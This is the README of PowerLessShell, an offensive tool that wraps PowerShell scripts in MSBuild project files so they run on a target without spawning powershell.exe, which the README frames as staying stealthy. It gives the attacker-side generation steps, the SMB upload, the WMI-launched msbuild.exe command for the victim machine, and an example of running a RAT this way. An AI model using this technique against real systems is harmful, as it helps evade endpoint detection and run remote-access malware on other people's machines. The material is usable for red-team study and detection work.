# PowerLessShell

PowerLessShell rely on MSBuild.exe to remotely execute PowerShell scripts and commands without spawing powershell.exe

# Usage

Attacker side
```
$ python PowerLessShell.py


PowerLessShell - Remain Stealth
         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team
            ___
        .-"; ! ;"-.
      .'!  : | :  !`.
     /\  ! : ! : !  /\
    /\ |  ! :|: !  | /\
   (  \ \ ; :!: ; / /  )
  ( `. \ | !:|:! | / .' )
  (`. \ \ \!:|:!/ / / .')
   \ `.`.\ |!|! |/,'.' /
    `._`.\\!!!// .'_.'
       `.`.\|//.'.'
        |`._`n'_.'|
        `----^----"



(Path to the PowerShell script)>>> ../test.txt

(Path for the output MsBuild file)>>> ../payload.csproj

Upload payload.csproj on the target system through SMB
Run the following command on the target system using WMI:
cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.csproj
```

Victim side (Push the file using SMB. Execute the following command using WMI)
```
cmd.exe /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload
```

# Example

The following example is running the RC4 RAT https://github.com/Mr-Un1k0d3r/RC4-PowerShell-RAT without running a single instance of PowerShell

![PowerLessShell](https://ringzer0team.com/powershellless.png)

# TODO 
Use impacket library to automate the file push and execution of the msbuild command.

# Credit
Mr.Un1k0d3r RingZer0 Team 2017

